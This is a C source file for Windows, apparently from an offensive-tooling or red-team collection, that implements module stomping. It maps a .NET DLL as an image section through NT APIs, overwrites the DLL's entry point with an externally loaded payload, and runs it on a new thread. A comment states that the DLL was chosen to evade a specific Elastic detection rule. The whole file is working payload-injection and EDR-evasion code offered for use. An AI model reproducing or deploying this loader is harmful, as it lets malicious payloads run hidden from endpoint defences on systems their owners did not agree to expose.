#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

// Section Mapping approach: NtCreateSection + NtMapViewOfSection
// Avoids LoadLibrary - maps DLL as file-backed image without PEB registration
// Uses non-System32 DLL to avoid Elastic's image_hollow_from_unusual_stack rule

#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection) {
        PrintError("Failed to resolve NT APIs");
        free(payload);
        return 1;
    }
    PrintSuccess("NT API functions resolved");

    PrintStep(2, "Opening sacrificial DLL file");
    HANDLE hFile = CreateFileW(STOMP_DLL_PATH, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFileW failed");
        free(payload);
        return 1;
    }
    wprintf(L"[+] Opened: %s\n", STOMP_DLL_PATH);

    PrintStep(3, "Creating section object (SEC_IMAGE)");
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                                       PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (status != STATUS_SUCCESS) {
        printf("[-] NtCreateSection failed: 0x%lx\n", status);
        free(payload);
        return 1;
    }
    PrintSuccess("Section created (SEC_IMAGE)");

    PrintStep(4, "Mapping section into current process");
    PVOID baseAddr = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &baseAddr,
                                 0, 0, NULL, &viewSize, 1 /* ViewShare */, 0, PAGE_READONLY);
    if (status != STATUS_SUCCESS && status != 0x40000003 /* STATUS_IMAGE_NOT_AT_BASE */) {
        printf("[-] NtMapViewOfSection failed: 0x%lx\n", status);
        free(payload);
        return 1;
    }
    printf("[+] Mapped at: 0x%p (size: %zu)\n", baseAddr, viewSize);

    // Parse PE headers to find entry point
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)baseAddr + dosHeader->e_lfanew);

    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)baseAddr + entryPointRVA);
    wprintf(L"[+] %s loaded at: 0x%p\n", STOMP_DLL_PATH, baseAddr);
    printf("[+] Entry point: 0x%p\n", entryPoint);

    // Find .text section size for validation
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD textSize = 0;
    LPVOID textAddr = NULL;

    printf("[+] Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        printf("[DEBUG] Section %d: '%.8s' (Raw: 0x%lx)\n", i,
               sectionHeader[i].Name, sectionHeader[i].SizeOfRawData);
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textAddr = (LPVOID)((BYTE*)baseAddr + sectionHeader[i].VirtualAddress);
            textSize = sectionHeader[i].Misc.VirtualSize;
        }
    }

    if (!textAddr || payloadSize > textSize) {
        printf("[-] .text section too small or not found (need %lu, have %lu)\n",
               payloadSize, textSize);
        free(payload);
        return 1;
    }
    printf("[+] Found .text section at: 0x%p, size: %lu\n", textAddr, textSize);
    printf("[+] Available memory (from EP): %lu bytes\n", (DWORD)((BYTE*)textAddr + textSize - (BYTE*)entryPoint));
    printf("[+] Payload size: %lu bytes\n", payloadSize);
    PrintSuccess("Payload size verification passed");

    PrintStep(5, "Stomping module memory");
    DWORD oldProtect;
    if (!VirtualProtect(entryPoint, payloadSize, PAGE_READWRITE, &oldProtect)) {
        PrintError("VirtualProtect (RW) failed");
        free(payload);
        return 1;
    }
    PrintSuccess("Memory protection changed to RW");

    memcpy(entryPoint, payload, payloadSize);
    PrintSuccess("Payload written to entry point");
    free(payload);

    DWORD tmpProtect;
    VirtualProtect(entryPoint, payloadSize, oldProtect, &tmpProtect);
    PrintSuccess("Memory protection restored to RX");
    PrintSuccess("Module stomping completed");

    PrintStep(6, "Executing payload via NtCreateThreadEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    HANDLE hThread = NULL;

    if (NtCreateThreadEx) {
        status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
                                   entryPoint, NULL, 0, 0, 0, 0, NULL);
        if (status == STATUS_SUCCESS) {
            printf("[+] Thread created via NtCreateThreadEx\n");
        }
    }

    if (!hThread) {
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
        if (!hThread) { PrintError("CreateThread failed"); return 1; }
        printf("[+] Thread created via CreateThread\n");
    }

    printf("[+] Executing payload via NtCreateThreadEx\n");
    PrintSuccess("Thread created successfully");
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
